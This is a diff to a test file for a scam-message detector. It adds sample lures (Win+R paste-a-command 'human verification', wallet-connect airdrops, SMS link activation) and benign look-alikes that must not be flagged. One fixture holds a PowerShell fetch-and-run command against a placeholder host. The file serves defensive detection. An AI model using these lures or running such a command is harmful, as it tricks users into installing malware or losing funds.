@@ -19,6 +19,13 @@ describe("message rules", () => {
     ["add me on telegram, i'll give you free skins", ["free-reward", "move-off-platform"]],
     ["Your Steam account will be banned in 24 hours, log in here to verify", ["account-threat", "urgency", "login-link"]],
     ["can you screen share so I can verify you own the account", ["screen-share", "trade-verify"]],
+    ["Verify you are human: 1. Press Windows Button + R 2. Press CTRL + V 3. Press Enter", ["command-paste"]],
+    ["to join the server you have to pass the bot check, open powershell and paste the code from the site", ["command-paste"]],
+    ["paste the command in the run box to verify you are not a robot", ["command-paste", "run-command"]],
+    ["run this in powershell to get the mod menu: irm https://mods.example | iex", ["run-command"]],
+    ["connect your wallet to claim the free airdrop before it ends", ["wallet-connect"]],
+    ["sync your metamask on the event page to get the NFT", ["wallet-connect"]],
+    ["Your package is on hold. Please reply Y, then exit the text message and reopen it to activate the link", ["link-activation"]],
   ])("flags %j", (text, expected) => {
     expect(ids(text)).toEqual(expect.arrayContaining(expected));
   });
@@ -33,6 +40,11 @@ describe("message rules", () => {
     "Reminder: never share your password or 2FA code with anyone",
     "don't scan QR codes from strangers",
     "join my server, it has a minecraft event this weekend",
+    "press windows + r and type dxdiag so we can see your gpu",
+    "reply yes if you are coming tonight, here is the link to the server",
+    "my steam wallet balance is low again",
+    "If the button does not work, copy and paste this link into your browser",
+    "never paste commands from strangers into powershell",
   ])("stays quiet for %j", (text) => {
     expect(analyzeMessage(text).signals.filter((signal) => signal.strength !== "weak")).toEqual([]);
   });
@@ -43,6 +55,8 @@ describe("message rules", () => {
 
   it("reports the scam family", () => {
     expect(analyzeMessage("I accidentally reported you").families).toEqual(["false_report"]);
+    expect(analyzeMessage("verify you are human: press win+r, then ctrl+v").families).toEqual(["command_paste"]);
+    expect(analyzeMessage("connect your wallet to claim the airdrop").families).toEqual(["wallet_drainer"]);
   });
 
   it("folds leetspeak only inside words", () => {
